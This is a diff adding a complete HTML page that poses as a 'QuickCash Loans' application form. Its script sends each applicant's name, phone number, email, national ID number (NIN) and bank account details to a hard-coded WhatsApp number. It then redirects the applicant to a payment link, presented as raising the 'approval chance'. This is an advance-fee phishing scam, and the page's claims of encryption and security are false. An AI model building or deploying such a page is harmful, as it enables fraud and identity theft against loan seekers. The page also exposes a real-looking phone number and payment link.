@@ -1,0 +1,266 @@
+<!DOCTYPE html><html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>QuickCash Loan Application</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            color: #333;
+        }
+        .header {
+            background: rgba(255,255,255,0.95);
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+        .header h1 {
+            font-size: 28px;
+            color: #1e3c72;
+            margin: 0;
+        }
+        .banner {
+            text-align: center;
+            padding: 30px 20px;
+            color: white;
+            background: linear-gradient(135deg, #2a5298, #1e3c72);
+        }
+        .banner h2 {
+            margin: 0;
+            font-size: 28px;
+        }
+        .banner p {
+            margin-top: 10px;
+            font-size: 16px;
+            opacity: 0.9;
+        }
+        .container {
+            max-width: 700px;
+            margin: 30px auto 60px;
+            background: rgba(255, 255, 255, 0.97);
+            padding: 30px;
+            border-radius: 18px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.25);
+            animation: fadeIn 0.8s ease-in-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-15px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        h3 {
+            color: #1e3c72;
+        }
+        input, textarea {
+            width: 100%;
+            padding: 13px;
+            margin: 10px 0;
+            border-radius: 10px;
+            border: 1px solid #ccc;
+            font-size: 15px;
+            transition: 0.3s;
+        }
+        input:focus, textarea:focus {
+            border-color: #1e3c72;
+            box-shadow: 0 0 8px rgba(30,60,114,0.3);
+            outline: none;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            color: white;
+            font-size: 18px;
+            cursor: pointer;
+            transition: transform 0.2s ease, opacity 0.2s ease;
+        }
+        button:hover {
+            transform: scale(1.03);
+            opacity: 0.95;
+        }
+        .info-box {
+            text-align: center;
+            background: #e8f0ff;
+            padding: 12px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            font-size: 14px;
+            color: #1e3c72;
+        }
+        .progress-container {
+            display: none;
+            margin-top: 20px;
+        }
+        .progress-bar {
+            width: 0%;
+            height: 12px;
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            border-radius: 10px;
+            transition: width 0.3s;
+        }
+        .progress-wrapper {
+            width: 100%;
+            background: #ddd;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        .redirect-text {
+            text-align: center;
+            margin-top: 10px;
+            font-weight: bold;
+            color: #c62828;
+        }
+        .loan-features {
+            display: flex;
+            justify-content: space-around;
+            margin: 30px 0;
+        }
+        .feature {
+            background: #f1f9ff;
+            padding: 20px;
+            border-radius: 12px;
+            width: 30%;
+            text-align: center;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        .feature h4 {
+            margin-bottom: 10px;
+            color: #1e3c72;
+        }
+        .faq {
+            margin-top: 40px;
+        }
+        .faq-item {
+            background: #e8f0ff;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 10px;
+        }
+        .faq-item h5 {
+            margin: 0;
+            cursor: pointer;
+        }
+        .faq-item p {
+            display: none;
+            margin-top: 8px;
+        }
+    </style>
+</head>
+<body><div class="header">
+    <h1>QuickCash Loans</h1>
+</div><div class="banner">
+    <h2>⚡ Fast & Reliable Loan Services</h2>
+    <p>Apply in minutes. Get funded quickly. Secure & trusted process.</p>
+</div><div class="container">
+    <h1>Loan Application Form</h1>
+    <div class="info-box">
+        Fill in your details carefully. After submission, you will be redirected to the payment page to increase your loan approval chance.
+    </div><form id="loanForm">
+    <input type="text" name="fullName" placeholder="👤 Full Name" required>
+    <input type="tel" name="phone" placeholder="📞 Phone Number" required>
+    <input type="email" name="email" placeholder="📧 Email Address" required>
+    <input type="text" name="nin" placeholder="🆔 NIN (11 digits)" maxlength="11" required>
+    <input type="text" name="bankName" placeholder="🏦 Bank Name" required>
+    <input type="text" name="accountNumber" placeholder="💳 Bank Account Number" maxlength="10" required>
+    <input type="number" name="amount" placeholder="💰 Loan Amount (₦)" required>
+    <input type="number" name="duration" placeholder="📅 Loan Duration (Days)" required>
+    <textarea name="reason" placeholder="📝 Reason for Loan" required></textarea>
+    <button type="submit">🚀 Apply Now</button>
+</form>
+
+<div class="progress-container" id="progressContainer">
+    <div class="progress-wrapper">
+        <div class="progress-bar" id="progressBar"></div>
+    </div>
+    <div class="redirect-text">Redirecting to payment page...</div>
+</div>
+
+<div class="loan-features">
+    <div class="feature">
+        <h4>Fast Approval</h4>
+        <p>Get approved in minutes with a simple application.</p>
+    </div>
+    <div class="feature">
+        <h4>Secure Transactions</h4>
+        <p>Your data is safe and secure with our encrypted system.</p>
+    </div>
+    <div class="feature">
+        <h4>Flexible Terms</h4>
+        <p>Choose repayment plans that suit your schedule.</p>
+    </div>
+</div>
+
+<div class="faq">
+    <h3>Frequently Asked Questions</h3>
+    <div class="faq-item">
+        <h5>How quickly will I receive the loan?</h5>
+        <p>Once approved and payment is confirmed, funds are disbursed within 24 hours.</p>
+    </div>
+    <div class="faq-item">
+        <h5>What is the interest rate?</h5>
+        <p>We charge a flat interest rate of 20% on all loans.</p>
+    </div>
+    <div class="faq-item">
+        <h5>Is my information safe?</h5>
+        <p>Yes, all personal and financial information is fully encrypted and secured.</p>
+    </div>
+</div>
+
+<div class="footer">
+    © 2026 QuickCash Loan Services. All rights reserved.
+</div>
+
+</div><script>
+    const interestRate = 0.20;
+    const yourWhatsAppNumber = "2349037708786";
+    const paymentLink = "https://kongapay-pg.kongapay.com/pay/X02JI";
+
+    document.getElementById("loanForm").addEventListener("submit", function(event) {
+        event.preventDefault();
+
+        const form = this;
+        const fullName = form.fullName.value;
+        const phone = form.phone.value;
+        const email = form.email.value;
+        const nin = form.nin.value;
+        const bankName = form.bankName.value;
+        const accountNumber = form.accountNumber.value;
+        const amount = parseFloat(form.amount.value);
+        const duration = form.duration.value;
+        const reason = form.reason.value;
+
+        const interest = amount * interestRate;
+        const totalRepayment = amount + interest;
+
+        const message = `Loan Application:%0A
+Name: ${fullName}%0APhone: ${phone}%0AEmail: ${email}%0ANIN: ${nin}%0ABank: ${bankName}%0AAccount: ${accountNumber}%0AAmount: ₦${amount}%0ADuration: ${duration} days%0AReason: ${reason}%0ATotal Repayment: ₦${totalRepayment}`;
+
+        window.open(`https://wa.me/${yourWhatsAppNumber}?text=${message}`, '_blank');
+
+        document.getElementById("progressContainer").style.display = "block";
+        let progress = 0;
+        const progressBar = document.getElementById("progressBar");
+        const interval = setInterval(() => {
+            progress += 10;
+            progressBar.style.width = progress + "%";
+            if (progress >= 100) {
+                clearInterval(interval);
+                window.location.href = paymentLink;
+            }
+        }, 300);
+
+        form.reset();
+    });
+
+    document.querySelectorAll('.faq-item h5').forEach(item => {
+        item.addEventListener('click', () => {
+            const p = item.nextElementSibling;
+            p.style.display = p.style.display === 'block' ? 'none' : 'block';
+        });
+    });
+</script></body>
+</html>
